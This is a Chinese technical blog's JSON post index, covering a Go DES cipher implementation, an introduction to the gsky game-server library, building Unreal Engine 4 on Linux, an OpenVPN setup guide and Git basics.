根据行号和列好查询的到4bit的二进制数，对该二进制数进行大端处理即可完毕S盒*/func SBox(num uint64) uint32&#123;    var sBox = [8][4][16]uint8&#123;\t\t&#123;&#123;14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7&#125;,        &#123;0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8&#125;,        &#123;4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0&#125;,        &#123;15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13&#125;,&#125;,\t\t&#123;&#123;15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10&#125;,        &#123;3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5&#125;,        &#123;0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15&#125;,        &#123;13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9&#125;,&#125;,\t\t&#123;&#123;10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8&#125;,        &#123;13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1&#125;,        &#123;13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7&#125;,        &#123;1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12&#125;,&#125;,\t\t&#123;&#123;7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15&#125;,        &#123;13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9&#125;,        &#123;10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4&#125;,        &#123;3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14&#125;,&#125;,\t\t&#123;&#123;2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9&#125;,        &#123;14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6&#125;,        &#123;4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14&#125;,        &#123;11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3&#125;,&#125;,\t\t&#123;&#123;12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11&#125;,        &#123;10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8&#125;,        &#123;9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6&#125;,        &#123;4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13&#125;,&#125;,\t\t&#123;&#123;4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1&#125;,        &#123;13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6&#125;,        &#123;1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2&#125;,        &#123;6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12&#125;,&#125;,\t\t&#123;&#123;13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7&#125;,        &#123;1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2&#125;,        &#123;7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8&#125;,        &#123;2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11&#125;,&#125;,\t&#125;    var out uint32 = 0    for i := 0; i &lt; 8; i ++ &#123;        b := (uint8)(num &gt;&gt; (i * 6)) &amp; 0x3f        r := (b &amp; 1) &lt;&lt; 1 + (b &gt;&gt; 5)        c := ((b &gt;&gt; 1) &amp; 1) &lt;&lt; 3 + ((b &gt;&gt; 2) &amp; 1) &lt;&lt; 2 + ((b &gt;&gt; 3) &amp; 1) &lt;&lt; 1 + ((b &gt;&gt; 4) &amp; 1)        o := sBox[i][r][c]        // 由于查表是小端模式，需要转换至大端        var o2 uint8 = 0        for j := 0; j &lt; 4; j ++&#123;            o2 |= ((o &gt;&gt; j) &amp; 1) &lt;&lt; (3 - j)        &#125;        out |= uint32(o2) &lt;&lt; (i * 4)                if debug == true &#123;            //fmt.Printf(&quot;b: %06b r: %d c: %d, o: %04b o2: %04b\\n&quot;, b, r, c, o, o2)        &#125;    &#125;    return out&#125;/*    P和置换    与IP置换原理一样*/func PBox(num uint32) uint32 &#123;\tvar pTable = [32]uint8&#123;        16,7,20,21,        29,12,28,17,        1,15,23,26,        5,18,31,10,        2,8,24,14,        32,27,3,9,        19,13,30,6,        22,11,4,25,    &#125;    var out uint32 = 0    for i := 0; i &lt; 32; i ++ &#123;        out |= (num &gt;&gt; (uint32(pTable[i] - 1)) &amp; 0x1) &lt;&lt; i    &#125;    return out&#125;/*    子密钥生成部分    获取64bit的密钥后，经过PC1置换，获取56bit有效位，分成两组28bit，分别为C0，D0。    C0，D0通过循环左移得到C1，D1，组装在一起，经过PC2置换得到第一轮子密钥。        C1与D1经过循环左移，得到C2，D2,组装在一起，经过PC2置换得到第二轮密钥，以此类推，得到下一轮密钥。*//*    将64bit的密钥压缩生成56bit*/func PC1(num uint64) uint64&#123;\tvar p1Table = [56]uint8 &#123;        57,49,41,33,25,17,9,        1,58,50,42,34,26,18,        10,2,59,51,43,35,27,        19,11,3,60,52,44,36,        63,55,47,39,31,23,15,        7,62,54,46,38,30,22,        14,6,61,53,45,37,29,        21,13,5,28,20,12,4 ,    &#125;    var out uint64 = 0    for i := 0; i &lt; 56; i++ &#123;        out |= (uint64)((num &gt;&gt; (p1Table[i] - 1)) &amp; 1) &lt;&lt; i;    &#125;    return out&#125;/*    将56bit的密钥压缩生成48bit*/func PC2(num uint64) uint64&#123;\tvar p2Table = [48]uint8&#123;        14,17,11,24,1,5,        3,28,15,6,21,10,        23,19,12,4,26,8,        16,7,27,20,13,2,        41,52,31,37,47,55,        30,40,51,45,33,48,        44,49,39,56,34,53,        46,42,50,36,29,32,    &#125;    var out uint64 = 0    for i := 0; i &lt; 48; i++ &#123;        out |= (uint64)(num &gt;&gt; (p2Table[i] - 1) &amp; 1) &lt;&lt; i;    &#125;    return out&#125;/*    循环左移*/func ShiftLeft(num uint32, times int) uint32 &#123;    if(times &gt; 16 || times &lt; 1) &#123;        fmt.Println(&quot;ShiftLeft Error&quot;)        return num    &#125;    var shiftTable = [16]int &#123;        1, 1, 2, 2, 2, 2, 2, 2,        1, 2, 2, 2, 2, 2, 2, 1,    &#125;    // 由于在数值中，高位在左，低位在右，所以采用右移，在大端模式下是左移    var out uint32 = num    for i := 0; i &lt; shiftTable[times - 1]; i++ &#123;        h := num &amp; 1 // 获取最低位        out &gt;&gt;= 1         out |= h &lt;&lt; 27 // 低位补高位    &#125;    return out &#125;/*    IP逆置换，经过16轮变换之后，得到64bit数据，最后一步是IP逆置换。    IP逆置换正好是IP置换的逆。*/func InverseIPRplace(num uint64) uint64 &#123;    var IPTable = [64]uint8 &#123;        40,8,48,16,56,24,64,32,        39,7,47,15,55,23,63,31,        38,6,46,14,54,22,62,30,        37,5,45,13,53,21,61,29,        36,4,44,12,52,20,60,28,        35,3,43,11,51,19,59,27,        34,2,42,10,50,18,58,26,        33,1,41,9,49,17,57,25,&#125;    var out uint64 = 0    for i := 0; i &lt; 64; i ++ &#123;        out |= (num &gt;&gt; (uint64(IPTable[i] - 1)) &amp; 0x1) &lt;&lt; i    &#125;    return out&#125;// 单轮加密实现// m 为R(i - 1), key为本轮次子密钥func SingalRound(l uint32, r uint32, key uint64) uint32 &#123;    o := E_Expand(r)    o ^= key    so := SBox(o)    so = PBox(so)    return so ^ l;&#125;// 子密钥生成器func DesKeyGen(key uint64) [16]uint64 &#123;    var out = [16]uint64 &#123;0&#125;    o := PC1(key)    l := (uint32)(o &amp; 0xfffffff) // 获取低28bit    r := (uint32)(o &gt;&gt; 28)       // 获取高28bit    for i := 1; i &lt;= 16; i++ &#123;        l = ShiftLeft(l, i)        r = ShiftLeft(r, i)        o = uint64(l)        o |= (uint64)(r &lt;&lt; 28)        o = PC2(o)        out[i - 1] = o    &#125;    return out&#125;// Des加密函数实现func DesEncode(m []byte, key uint64) []byte &#123;    keys := DesKeyGen(key)    out := make([]byte, 0)    length := len(m)    if(length % 8 != 0) &#123; // 补充0        for i := 0; i &lt; (8 - (length % 8)); i ++ &#123;            m = append(m, 0)        &#125;        length = len(m)    &#125;    // 每8字节进行加密    for i := 0; i &lt; (length / 8); i++ &#123;        var d uint64 = 0        // 将8字节转化为uint64类型        for j := 0; j &lt; 8; j++ &#123;            var c uint8 = m[i * 8 + j] // 获取当前字节            // 由是小端模式，需要转换至大端            var o2 uint8 = 0            for k := 0; k &lt; 8; k ++&#123;                o2 |= ((c &gt;&gt; k) &amp; 1) &lt;&lt; (7 - k)            &#125;           d |= uint64(o2) &lt;&lt; (j * 8)        &#125;        //fmt.Printf(&quot;o  : %064b\\n&quot;, d)        //PrintInt64B(&quot;m &quot;, d)        // IP置换        o := IPRplace(d)        l := uint32(o)        r := uint32(o &gt;&gt; 32)        t := uint32(0)        // 轮加密        for j := 0; j &lt; 16; j ++ &#123;            t = r            r = SingalRound(l, r, keys[j])            l = t        &#125;        //PrintInt32B(&quot;l0 &quot;, l)        //PrintInt32B(&quot;r0&quot;, r)        // 左右交换合并        d = uint64(r)        d |= uint64(l) &lt;&lt; 32        //PrintInt64B(&quot;r0&quot;, d)        // IP逆向置换        d = InverseIPRplace(d)        //PrintInt64B(&quot;IpInverse: &quot;, d)        // 追加到Bytes        // 将uint64转化为8字节        for j := 0; j &lt; 8; j++ &#123;            //var c uint8 = m[i * 8 + j] // 获取当前字节            // 大端模式，需要转换至小端            c := uint8(d &gt;&gt; (j * 8) &amp; 0xff)            var o2 uint8 = 0            for k := 0; k &lt; 8; k ++&#123;                o2 |= ((c &gt;&gt; k) &amp; 1) &lt;&lt; (7 - k)            &#125;            out = append(out, o2)           //d |= uint64(o2) &lt;&lt; (j * 8)        &#125;    &#125;    //GetUint64ByBytes(&amp;m[8])    //IPRplace()    return out&#125;// Des解密函数实现func DesDecode(m []byte, key uint64) []byte &#123;    keys := DesKeyGen(key)    out := make([]byte, 0)    length := len(m)    // 每8字节进行加密    for i := 0; i &lt; (length / 8); i++ &#123;        var d uint64 = 0        // 将8字节转化为uint64类型        for j := 0; j &lt; 8; j++ &#123;            var c uint8 = m[i * 8 + j] // 获取当前字节            // 由是小端模式，需要转换至大端            var o2 uint8 = 0            for k := 0; k &lt; 8; k ++&#123;                o2 |= ((c &gt;&gt; k) &amp; 1) &lt;&lt; (7 - k)            &#125;           d |= uint64(o2) &lt;&lt; (j * 8)        &#125;        // IP置换        o := IPRplace(d)        l := uint32(o)        r := uint32(o &gt;&gt; 32)        t := uint32(0)        // 轮加密        for j := 0; j &lt; 16; j ++ &#123;            t = r            r = SingalRound(l, r, keys[15 - j]) // 密钥顺序变化            l = t        &#125;        // 左右交换合并        d = uint64(r)        d |= uint64(l) &lt;&lt; 32        //PrintInt64B(&quot;r0&quot;, d)        // IP逆向置换        d = InverseIPRplace(d)        //PrintInt64B(&quot;IpInverse: &quot;, d)        // 追加到Bytes        // 将uint64转化为8字节        for j := 0; j &lt; 8; j++ &#123;            //var c uint8 = m[i * 8 + j] // 获取当前字节            // 大端模式，需要转换至小端            c := uint8(d &gt;&gt; (j * 8) &amp; 0xff)            var o2 uint8 = 0            for k := 0; k &lt; 8; k ++&#123;                o2 |= ((c &gt;&gt; k) &amp; 1) &lt;&lt; (7 - k)            &#125;            out = append(out, o2)           //d |= uint64(o2) &lt;&lt; (j * 8)        &#125;    &#125;    return out&#125;func Test() &#123;    str := &quot;01100011 01101111 01101101 01110000 01110101 01110100 01100101 01110010&quot;    subkey := &quot;010100 000010 110010 101100 010101 000010 001101 000111&quot;    o := BinStrToIntB(str)    key := BinStrToIntB(subkey)    fmt.Printf(&quot;字符串: %s\\n&quot;, str)    fmt.Printf(&quot;Little: %064b\\n&quot;, o)    PrintInt64B(&quot;Input  &quot;, o)    o = IPRplace(o)    PrintInt64B(&quot;IPTable &quot;, o)    l := uint32(o)    r := uint32(o &gt;&gt; 32)    PrintInt32B(&quot;l0 &quot;, l)    PrintInt32B(&quot;r0&quot;, r)    PrintInt32B(&quot;E_Expand in  &quot;, r)    o = E_Expand(r)    PrintInt48B(&quot;E_Expand out &quot;, o)    fmt.Println(&quot;\\nS盒实现&quot;)    PrintInt48B(&quot;key &quot;, key)    si := o ^ key    PrintInt48B(&quot;SBox in &quot;, si)    so := SBox(si)    PrintInt32B(&quot;SBox out &quot;, so)    po := PBox(so)    PrintInt32B(&quot;PBox out &quot;, po)    l = l ^ po // 作为下一轮 l    PrintInt32B(&quot;l1 &quot;, l)    fmt.Println(&quot;子密钥生成实现: 输入01234567&quot;)    subkey = &quot;00110000 00110001 00110010 00110011 00110100 00110101 00110110 00110111&quot;    key = BinStrToIntB(subkey)    PrintInt64B(&quot;key &quot;, key)    o = PC1(key)    PrintInt56B(&quot;PC1 &quot;, o)    l = (uint32)(o &amp; 0xfffffff) // 获取低28bit    r = (uint32)(o &gt;&gt; 28) // 获取高28bit    PrintInt28B(&quot;l &quot;, l)    PrintInt28B(&quot;r &quot;, r)    fmt.Println(&quot;循环左移&quot;)    l = ShiftLeft(l, 1)    PrintInt28B(&quot;l &quot;, l)    fmt.Println(&quot;IP逆置换&quot;)    str = &quot;11111111 10111000 01110110 01010111 00000000 11111111 00000110 10000011&quot;    o = BinStrToIntB(str)    PrintInt64B(&quot;Input      &quot;, o)    o = InverseIPRplace(o)    PrintInt64B(&quot;InverseIP  &quot;, o)&#125;func main() &#123;    //Test()    data := []byte&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, &#x27;A&#x27;, &#x27;D&#x27;&#125;    var key uint64 = 0x1234    fmt.Print(&quot;加密前data&quot;)    fmt.Println(data)    fmt.Printf(&quot;key: 0x%X\\n&quot;, key)    out := DesEncode(data, key)    fmt.Println(&quot;加密后&quot;)    fmt.Print(out)    out = DesDecode(out, key)    fmt.Printf(&quot;\\n解密后&quot;)    fmt.Print(out)&#125;\n\n\n\n","categories":["security"],"tags":["crypto"]},{"title":"gsky简易高性能游戏服务器框架库介绍","url":"/2021/07/01/dev/game/server/gsky-1/","content":"有时候方便自己快速开发小游戏服务器，自己采用go，python，c#那些也简单写过一点游戏后台，但是针对与socket长连接，感觉有点不太好控制，go稍微好些，这个项目是以前写的web服务器，最近在搞游戏项目，把它移植为一个库，且采用psp(pwnsky protocol)二进制传输协议更快速应对客户请求。\ngithub链接: https://github.com/pwnsky/gsky\n若有师傅们想参与一起完善维护的可以私信我: QQ: 418894113。\n下面是一些简单的使用例子，后期得把文档完善一下。\ngsky简易高性能游戏服务器框架库介绍介绍为了便于更快速开发高性能游戏服务器，特意基于lgx web服务器框架，二次开发且封装为一个服务器库。 gsky是一个基于epoll架构的高性能游戏服务器库，采用更快速的psp (pwnsky protocol)二进制协议进行传输数据。\n如何使用？git clone https://github.com/pwnsky/gsky.gitcd gskymake -j # 编译gsky库make install # 安装gsky库\n\n该库提供编译好的.so文件以及api头文件，更利于开发和编译服务器。\n编译成功后，所有文件在build目录下，如下。\nbuild├── include│   └── gsky│       ├── gsky.hh # gsky服务器总声明│       ├── log # 日志模块│       │   ├── log.hh│       │   └── log_thread.hh│       ├── net # 网络模块│       │   ├── channel.hh│       │   ├── epoll.hh│       │   ├── eventloop.hh│       │   ├── eventloop_thread.hh│       │   ├── eventloop_threadpool.hh│       │   ├── net.hh│       │   ├── psp.hh│       │   └── util.hh│       ├── server.hh│       ├── thread # 线程模块│       │   ├── condition.hh│       │   ├── count_down_latch.hh│       │   ├── mutex_lock.hh│       │   ├── noncopyable.hh│       │   └── thread.hh│       ├── util # 工具模块│       │   ├── firewall.hh│       │   ├── json.hh│       │   ├── md5.hh│       │   ├── url.hh│       │   ├── util.hh│       │   └── vessel.hh│       └── work # 逻辑调用模块│           └── work.hh└── lib    └── libgsky.so # 编译好的gsky动态库\n\n详情请查看头文件api。\n编译安装好库之后，可以更方便的写游戏服务器了。\n例如: https://github.com/pwnsky/gsky/blob/main/example/server_1.cc\n// g++ main.cc -lpthread -lgsky -o gsky// ./gsky -c ../conf/gsky.conf//#include &lt;iostream&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;gsky/gsky.hh&gt;#include &lt;gsky/server.hh&gt;#include &lt;gsky/work/work.hh&gt;#define UNUSED(var) do &#123; (void)(var); &#125; while (false)//extern std::string gsky::data::config_path;//std::string gsky::data::os_info;gsky::server server;void gsky_exit(int s) &#123;    UNUSED(s);    server.stop();&#125;void help() &#123;    std::cout &lt;&lt; &quot;Usage: ./gsky [OPTION...] [SECTION] PAGE...\\n&quot;                &quot;-c   load configure file\\n&quot;                &quot;-h   help of gsky server\\n&quot;                &quot;-v   check version of gsky server\\n&quot;                 ;&#125;enum class RouterRoot &#123;    Keep = 0,    CheckUpdate,    Login,&#125;;// 服务器回调函数, 函数格式为 void func(gsky::work::work *)void server_run(gsky::work::work *w) &#123;    switch((RouterRoot)w-&gt;router_[0]) &#123;        case RouterRoot::Keep: &#123;            w-&gt;send_data(&quot;Keep&quot;); // 发送给客户端&quot;Keep&quot;字符串        &#125; break;        case RouterRoot::CheckUpdate: &#123;            std::cout &lt;&lt; &quot;checking updateing\\n&quot;;        &#125; break;        case RouterRoot::Login: &#123;            std::cout &lt;&lt; &quot;Login\\n&quot;;        &#125; break;        default: &#123;            w-&gt;send_data(w-&gt;content_.to_string()); // 回显输入的内容        &#125; break;    &#125;&#125;int main(int argc, char **argv) &#123;    ::signal(SIGINT, gsky_exit); // Ctrl + c 退出服务器    int opt = 0;    gsky::data::config_path = DEFAULT_CONFIG_FILE;    while((opt = getopt(argc, argv,&quot;h::v::a::c:&quot;))!=-1) &#123;        switch (opt) &#123;        case &#x27;h&#x27;: &#123;            help();            exit(0);        &#125; break;        case &#x27;c&#x27;: &#123;            // 设置服务器配置文件路径            server.set_config_path(optarg);        &#125; break;        case &#x27;v&#x27;: &#123;            // 显示 gsky lib 的版本号            std::cout &lt;&lt; &quot;gsky version: &quot; &lt;&lt; gsky::version() &lt;&lt; &#x27;\\n&#x27;;            exit(0);        &#125; break;        default: &#123;            std::cout &lt;&lt; &quot;-h get more info&quot; &lt;&lt; std::endl;            exit(0);        &#125;        &#125;    &#125;    // 设置服务器回调函数    server.set_func_handler(server_run);    server.run(); // 启动gsky服务器    std::cout &lt;&lt; &quot;\\033[40;33mgsky quited! \\n\\033[0m&quot;;    return 0;&#125;\n\n编译的时候\ng++ -lgsky -lpthread main.cc\n\n运行该程序需要指定下配置文件，一般常用配置文件在https://github.com/pwnsky/gsky/blob/main/conf/gsky.conf\n&#123;    &quot;protocol&quot;: &quot;psp&quot;,    &quot;port&quot; : 8080,    &quot;number_of_thread&quot;: 4,    &quot;log&quot; : &quot;./gsky.log&quot;,    &quot;firewall&quot; : &#123;    &#125;&#125;\n\n设置好配置文件之后加上-c参数指定配置文件路径\n./gsky -c ../conf/gsky.conf\n\n若出现\ngsky server port: 8080  number of thread: 4\n\n则说明运行成功了。\n测试服务器\n由于服务器采用psp协议进行传输的，使用example&#x2F;client.py进行测试，若想使用psp协议客户端，则访问https://github.com/pwnsky/psp下载相应的客户端psp协议库。\n./client.pysend...recv: router: b&#x27;\\x00\\x00\\x00\\x00&#x27; length: 4b&#x27;Keep&#x27;\n\n若运行出现以上内容，则服务器正常运行了。\n详情更多，请看测试目录下的例子。\n","categories":["dev"],"tags":["server"]},{"title":"在Linux上安装Unreal Engine 4","url":"/2021/06/29/dev/game/ue4/UnrealEngine-Install/","content":"在Linux上安装Unreal Engine 4环境安装这里主要是针对与linux环境下如何安装UE4引擎。\n官网注册帐号之后绑定github帐号，加入 Epic Games 组织后，即可获得Unreal Engine查看代码权限。\n官网: https://www.unrealengine.com/en-US/\n引擎源码: https://github.com/EpicGames/UnrealEngine\n下载最近源码包\nhttps://github.com/EpicGames/UnrealEngine/archive/refs/tags/4.26.2-release.tar.gz\n下载好之后\n由于我的是linux环境，linux运行\n./Setup.sh \n\n然后就是下载一些依赖包进行安装了。\n\n还要安装\n\n安装完毕后，生成工程文件\n./GenerateProjectFiles.sh\n\n\n编译源码\nmake -j 8\n\n\n编译过程有点长\n\n经过了漫长的编译，大概编译了3个小时多，磁盘挤爆了好几次，不断清理磁盘才够。\n\n启动UE4\n./Engine/Binaries/Linux/UE4Editor\n\n\n\n启动又要编译一会儿\n\nref:https://www.ue4community.wiki/legacy/building-on-linux-qr8t0si2\n启动完毕ok。\n但是感觉太占空间了，把中间文件给删掉。\nfind . -name &quot;*.o&quot; | xargs rm\n\ndu -sh 61G \n\n减小了20g左右。\n再把Source源代码给干掉\ncd Enginerm -rf Source \n\ndu -sh34G \n\n一下子从81G减小到了34G\n删了之后发现有个问题:启动UE4Editor时， libfbxsdk.so没了，网上找一个放在&#x2F;lib下就行了，我是从unity3d下复制过来的，在pkg网站也可以找到。\nhttps://archlinux.pkgs.org/rolling/chaotic-aur-x86_64/unity-editor-lts-1:2019.4.24f1-1-x86_64.pkg.tar.zst.html\n","categories":["dev"],"tags":["ue4"]},{"title":"openvpn环境搭建","url":"/2021/06/28/env/linux/openvpn/","content":"OPENVPN环境搭建说明：启动时注意用户权限，比如root用户启动。\nUbuntu：\n\n服务器环境：Ubuntu 16.04 64位系统\n内网IP：10.143.80.116\n外网IP：203.195.1.2\nOpenVPN版本：OpenVPN 2.3.10\n\nOpenVPN：\n\n一般以系统源安装的版本为准，比如现在安装的基本以2.3.10为主，可能以后会随着源升级而更新到最新版本。\n可以单独上官网（需要翻出去）下载指定版本的来安装，但前提注意系统安装的依赖。\n\n搭建过程：\n1、安装前准备\n# 安装openssl和lzo，lzo用于压缩通讯数据加快传输速度sudo apt-get install openssl libssl-devsudo apt-get install lzop\n\n2、安装及配置OpenVPN和easy-rsa\n# 安装openvpn和easy-rsasudo apt-get install openvpnsudo apt-get install easy-rsa# 修改vars文件 sudo sucd /usr/share/easy-rsa/ vim vars# 修改注册信息，比如公司地址、公司名称、部门名称等。export KEY_COUNTRY=&quot;CN&quot;export KEY_PROVINCE=&quot;Shandong&quot;export KEY_CITY=&quot;Qingdao&quot;export KEY_ORG=&quot;MyOrganization&quot;export KEY_EMAIL=&quot;me@myhost.mydomain&quot;export KEY_OU=&quot;MyOrganizationalUnit&quot;# 初始化环境变量source vars # 清除keys目录下所有与证书相关的文件# 下面步骤生成的证书和密钥都在/usr/share/easy-rsa/keys目录里./clean-all # 生成根证书ca.crt和根密钥ca.key（一路按回车即可）./build-ca # 为服务端生成证书和私钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）./build-key-server server # 每一个登陆的VPN客户端需要有一个证书，每个证书在同一时刻只能供一个客户端连接，下面建立2份# 为客户端生成证书和私钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）./build-key client1./build-key client2 # 创建迪菲·赫尔曼密钥，会生成dh2048.pem文件（生成过程比较慢，在此期间不要去中断它）./build-dh # 生成ta.key文件（防DDos攻击、UDP淹没等恶意攻击）openvpn --genkey --secret keys/ta.key\n\n3、创建服务器端配置文件\n# 在openvpn的配置目录下新建一个keys目录mkdir /etc/openvpn/keys # 将需要用到的openvpn证书和密钥复制一份到刚创建好的keys目录中cp /usr/share/easy-rsa/keys/&#123;ca.crt,server.&#123;crt,key&#125;,dh2048.pem,ta.key&#125; /etc/openvpn/keys/ # 复制一份服务器端配置文件模板server.conf到/etc/openvpn/gzip -d /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gzcp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/# 查看server.conf里的配置参数grep &#x27;^[^#;]&#x27; /etc/openvpn/server.conf# 编辑server.confvim /etc/openvpn/server.conf port 1194# 改成tcp，默认使用udp，如果使用HTTP Proxy，必须使用tcp协议proto tcpdev tun # 路由模式，桥接模式用dev tap# 路径前面加keys，全路径为/etc/openvpn/keys/ca.crtca keys/ca.crtcert keys/server.crtkey keys/server.key  # This file should be kept secretdh keys/dh2048.pem# 默认虚拟局域网网段，不要和实际的局域网冲突即可server 10.8.0.0 255.255.255.0 # 路由模式，桥接模式用server-bridgeifconfig-pool-persist ipp.txt# 10.0.0.0/8是我这台VPN服务器所在的内网的网段，读者应该根据自身实际情况进行修改push &quot;route 10.0.0.0 255.0.0.0&quot;# 可以让客户端之间相互访问直接通过openvpn程序转发，根据需要设置client-to-client# 如果客户端都使用相同的证书和密钥连接VPN，一定要打开这个选项，否则每个证书只允许一个人连接VPNduplicate-cnkeepalive 10 120tls-auth keys/ta.key 0 # This file is secretcomp-lzopersist-keypersist-tun# OpenVPN的状态日志，默认为/etc/openvpn/openvpn-status.logstatus openvpn-status.log# OpenVPN的运行日志，默认为/etc/openvpn/openvpn.log log-append openvpn.log# 改成verb 5可以多查看一些调试信息verb 5\n\n4、配置内核和防火墙，启动服务\n# 开启路由转发功能sed -i &#x27;/net.ipv4.ip_forward/s/0/1/&#x27; /etc/sysctl.confsed -i &#x27;/net.ipv4.ip_forward/s/#//&#x27; /etc/sysctl.confsysctl -p # 配置防火墙，别忘记保存iptables -I INPUT -p tcp --dport 1194 -m comment --comment &quot;openvpn&quot; -j ACCEPTiptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j MASQUERADEmkdir /etc/iptablesiptables-save &gt; /etc/iptables/iptables.conf# 关闭ufw防火墙，改成iptables，这一步按需要设置，比较ufw在Ubuntu默认关闭的。iptables和ufw任选一个即可。ufw disable # 启动openvpn并设置为开机启动systemctl start openvpn@serversystemctl enable openvpn@server# 在systemd单元文件的后面，我们通过指定特定的配置文件名来作为一个实例变量来开启OpenVPN服务，我们的配置文件名称为/etc/openvpn/server.conf，所以我们在systemd单元文件的后面添加@server来开启OpenVPN服务journalctl -xe # 查看启动日志\n\n5、创建客户端配置****文件client.ovpn（用于客户端软件使用）\n# 复制一份client.conf模板命名为client.ovpncp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/client.ovpn  # 编辑client.ovpnvim /etc/openvpn/client.ovpnclientdev tun # 路由模式# 改为tcpproto tcp# OpenVPN服务器的外网IP和端口remote 203.195.1.2 1194resolv-retry infinitenobindpersist-keypersist-tunca ca.crt# client1的证书cert client1.crt# client1的密钥key client1.keyns-cert-type server# 去掉前面的注释tls-auth ta.key 1comp-lzoverb 5\n\n6、配置client\n安装软件，可以和服务器安装的保持一致：\n# 安装openssl和lzo，lzo用于压缩通讯数据加快传输速度sudo apt-get install openssl libssl-devsudo apt-get install lzop# 安装openvpn和easy-rsasudo apt-get install openvpnsudo apt-get install easy-rsa\n\n在服务器上下载回需要的文件\nsz /etc/openvpn/client.ovpn /etc/openvpn/keys/ca.crt /etc/openvpn/keys/client1.crt /etc/openvpn/keys/client1.key /etc/openvpn/keys/ta.key\n\n将OpenVPN服务器上的client.ovpn、ca.crt、client1.crt、client1.key、ta.key上传到Linux客户端安装目录下的&#x2F;etc&#x2F;openvpn文件夹（使用rz命令）\n[root@linux64 openvpn]# pwd/etc/openvpn[root@linux64 openvpn]# lsca.crt client1.crt client1.key client.ovpn conf ta.key\n\n启动客户端\nopenvpn --daemon --cd /etc/openvpn --config client.ovpn --log-append /var/log/openvpn.log &amp;\n\n上面是以守护进程启动的，可以把上面脚本放在&#x2F;etc&#x2F;rc.local实现开机启动。或者使用以服务的形式启动，如果想清晰明了，建议放在启动脚本。\nref: http://www.manongjc.com/detail/6-eqkmpihxsfrrauu.html\nexplicit-exit-notify 1#此选项开启只能使用udp协议。否则会报错error: --explicit-exit-notify can only be used with --proto udp\n\nref: https://zhuanlan.zhihu.com/p/154309923\n","categories":["env"],"tags":["linux"]},{"title":"Git学习","url":"/2021/06/26/env/git/git/","content":"Git学习命令\n\n\n\n\n基本操作代码克隆\ngit clone  [url]\n\n查看状态\ngit status\n\n添加所需要push的文件或文件夹\ngit add . # 递归选定当前路径下的所有文件\n\n给修改的文件进行注释\ncommit -m &quot;msg&quot;\n\n推送\n推送你的代码到github仓库\ngit push# git push -u origin master# 如果新建的远程仓库是空的，所以要加上-u这个参数，等远程仓库里面有了内容之后，下次再从本地库上传内容的时候只需下面这样就可以了：# git push origin master\n\n\n\n空仓库//如何使用git上次自己的代码.cd project_path //进入到工程目录git init //初始话git仓库git add . //添加当前项目的所有文件//添加省份标识:git config --global user.email &quot;you@example.com&quot; //你的邮箱git config --global user.name &quot;Your Name&quot; //你的姓名//git commitgit commit -m &quot;Your_msg&quot; //预提交. -m 是代表一些注释.//创建SSH KEYssh-keygen -t rsa -C &quot;youremail@example.com&quot;将 ~/.ssh/id_rsa.pub中的内容添加到github中登录Github,找到右上角的图标，打开点进里面的Settings，再选中里面的SSH and GPG KEYS，点击右上角的New SSH key，然后Title里面随便填，再把刚才id_rsa.pub里面的内容复制到Title下面的Key内容框里面，最后点击Add SSH key第九步：关联好之后我们就可以把本地库的所有内容推送到远程仓库（也就是Github）上了，通过：git remote add origin git@github.com:I0gan/Litalk.git\n\n.gitignore创建工程时，按照工程采用的语言框架在项目根目录下自行定义 .gitignore文件对不需要push的文件进行排除。\n例如Unity3d项目的.gitignore\nUserSettings# ProjectSettings.vscode# This .gitignore file should be placed at the root of your Unity project directory## Get latest from https://github.com/github/gitignore/blob/master/Unity.gitignore#/[Ll]ibrary//[Tt]emp//[Oo]bj//[Bb]uild//[Bb]uilds//[Ll]ogs//[Mm]emoryCaptures/# Asset meta data should only be ignored when the corresponding asset is also ignored!/[Aa]ssets/**/*.meta# Uncomment this line if you wish to ignore the asset store tools plugin# /[Aa]ssets/AssetStoreTools*# Autogenerated Jetbrains Rider plugin[Aa]ssets/Plugins/Editor/JetBrains*# Visual Studio cache directory.vs/# Gradle cache directory.gradle/# Autogenerated VS/MD/Consulo solution and project filesExportedObj/.consulo/*.csproj*.unityproj*.sln*.suo*.tmp*.user*.userprefs*.pidb*.booproj*.svd*.pdb*.mdb*.opendb*.VC.db# Unity3D generated meta files*.pidb.meta*.pdb.meta*.mdb.meta# Unity3D generated file on crash reportssysinfo.txt# Builds*.apk*.unitypackage# Crashlytics generated 